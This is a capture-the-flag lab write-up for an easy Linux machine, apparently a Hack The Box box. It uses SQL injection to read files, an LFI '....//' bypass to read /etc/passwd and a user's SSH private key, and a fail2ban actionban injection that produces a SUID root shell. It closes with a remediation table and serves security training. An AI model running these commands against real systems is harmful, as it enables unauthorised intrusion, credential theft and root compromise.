**IP:** 10.129.36.192 | **Difficulty:** Easy | **OS:** Linux (Debian 10) | **Author:** Geiseric

## Summary

Linux machine running DNS, SMTP, HTTP and SSH. DNS zone transfer exposes `preprod-payroll.trick.htb`. The payroll system has SQL Injection with MySQL FILE privilege, allowing us to read `nginx.conf` and discover a second vHost: `preprod-marketing.trick.htb`. That vHost has an LFI with a `....//` bypass that leaks michael's SSH private key. Privesc via fail2ban: michael is in the `security` group (owns `action.d/`), can restart fail2ban as root via sudo — by modifying `actionban`, any IP ban triggers a root command.

## 3. SQL Injection with FILE Privilege → nginx.conf

```bash
sqlmap -u "http://preprod-payroll.trick.htb/ajax.php?action=login" \
  --data="username=abc&password=abc" -p username \
  --batch --dbms=mysql \
  --file-read=/etc/nginx/sites-enabled/default
```

nginx.conf reveals the second vHost: `preprod-marketing.trick.htb`.

```bash
echo "10.129.36.192 preprod-marketing.trick.htb" | sudo tee -a /etc/hosts
```

## 4. LFI with `....//` Bypass

The `?page=` parameter uses `include()` with a path prefix. The filter blocking `../` does not block `....//`:

```bash
# Confirm LFI
curl -s "http://preprod-marketing.trick.htb/index.php?page=....//....//....//etc/passwd"

# Read michael's private key
curl -s "http://preprod-marketing.trick.htb/index.php?page=....//....//....//home/michael/.ssh/id_rsa" \
  > /tmp/michael_id_rsa
chmod 600 /tmp/michael_id_rsa
```

---

## 5. Foothold — SSH as michael

ssh -i /tmp/michael_id_rsa michael@10.129.36.192
cat ~/user.txt

## 6. Privilege Escalation — fail2ban action.d

```bash
id
# groups=1001(michael),1002(security)

sudo -l
# (root) NOPASSWD: /etc/init.d/fail2ban restart

ls -la /etc/fail2ban/action.d/
# drwxrwx--- 2 root security ...   ← security group has write access
```

**Step 1 — Inject command into actionban:**

```bash
sed -i 's|actionban = .*|actionban = /bin/cp /bin/bash /tmp/bash_suid \&\& /bin/chmod +s /tmp/bash_suid|' \
  /etc/fail2ban/action.d/iptables-multiport.conf

sudo /etc/init.d/fail2ban restart
```

**Step 2 — Trigger a ban (from attacker host, wrong SSH password):**

```bash
for i in {1..8}; do
  sshpass -p wrongpass$RANDOM ssh -o PreferredAuthentications=password \
    michael@10.129.36.192 'exit' 2>/dev/null &
done
wait
```

fail2ban detects the failures, bans the IP → `actionban` executes as root → `/tmp/bash_suid` created.

**Step 3 — Fix SUID bit and execute:**

```bash
sed -i 's|actionban = .*|actionban = chmod 4755 /tmp/bash_suid|' \
  /etc/fail2ban/action.d/iptables-multiport.conf
sudo /etc/init.d/fail2ban restart
# trigger bans again...

/tmp/bash_suid -p -c 'cat /root/root.txt'
# <hash>
```

## Attack Chain

```
DNS AXFR → preprod-payroll.trick.htb
  ↓ SQLi FILE privilege → nginx.conf → preprod-marketing.trick.htb
  ↓ LFI ....// bypass → /home/michael/.ssh/id_rsa
  ↓ SSH michael → user.txt
  ↓ security group → /etc/fail2ban/action.d/ writable
  ↓ sed -i actionban + sudo fail2ban restart + SSH failures
  ↓ bash_suid → euid=0(root) → root.txt
```

## Lessons Learned

| Vulnerability | Remediation |
|---------------|-------------|
| DNS Zone Transfer enabled | Restrict AXFR to authorized servers |
| SQL Injection with FILE privilege | Input validation + least privilege on DB user |
| LFI without proper sanitization (`....//` bypass) | Whitelist allowed pages; never pass raw input to `include()` |
| SSH private key accessible via LFI | Never store keys in paths reachable via the web |
| fail2ban action.d writable by group | Remove group write permissions from the actions directory |
